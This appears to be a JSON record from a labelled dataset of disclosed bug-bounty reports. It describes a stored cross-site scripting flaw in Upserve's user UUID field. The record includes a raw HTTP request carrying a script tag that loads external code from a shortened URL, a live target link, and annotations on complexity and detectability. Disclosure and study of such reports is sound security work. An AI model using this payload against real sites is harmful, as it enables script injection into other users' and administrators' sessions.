@@ -1,0 +1,45 @@
+{
+  "reported_to": "Upserve ",
+  "reported_by": "cache-money ",
+  "title": "Ability to create own account UUID leads to stored XSS",
+  "content": "\nI found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an alert(1), because I think it could have been argued that the space was too small to actually do anything meaningful with.\nThis attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.\nPoC\nJust replace the email with the one you own, and click the email confirmation link.\nCode 439 Bytes\n1POST /c/user HTTP/1.1\n2Host: app.upserve.com\n3Accept: application/json\n4Accept-Language: en-US,en;q=0.5\n5X-Requested-With: XMLHttpRequest\n6Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n7Referer: https://app.upserve.com/settings/account\n8Content-Length: 134\n9Content-Type: text/plain;charset=UTF-8\n10DNT: 1\n11Connection: close\n12\n13uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi\nLive PoC\nVisit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002\nThe generated HTML looks like:\nYUI.namespace('Env.DATA').consumer = {\"uuid\":\"</script><script src=//is.gd/z0i2sU>\",\"firstName\":null,\nThanks,\n-- Tanner\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 1500,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1560196200,
+  "report_url": "https://hackerone.com/reports/249131",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to `/c/user` with a crafted `uuid` parameter containing a script tag and a URL-shortened external script source."
+    ],
+    [
+      2,
+      "Visit the generated link (e.g., `https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002`) to trigger the XSS payload."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows a user to inject arbitrary JavaScript via a crafted UUID, leading to stored XSS. The system fails to properly sanitize the UUID input, enabling script execution in contexts where the UUID is displayed (e.g., admin panels).",
+  "reason": "The attack involves bypassing character length restrictions with a URL-shortened payload and leveraging the lack of input sanitization. While the payload crafting is straightforward, the discovery of the unsanitized UUID field and its impact across the application (e.g., admin panels) requires some insight.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "246806",
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves manipulating the UUID field to inject malicious scripts, which is a form of stored XSS. This is not directly related to authentication or authorization bypass, but rather a client-side injection vulnerability. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities by testing session and resource access boundaries, not injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
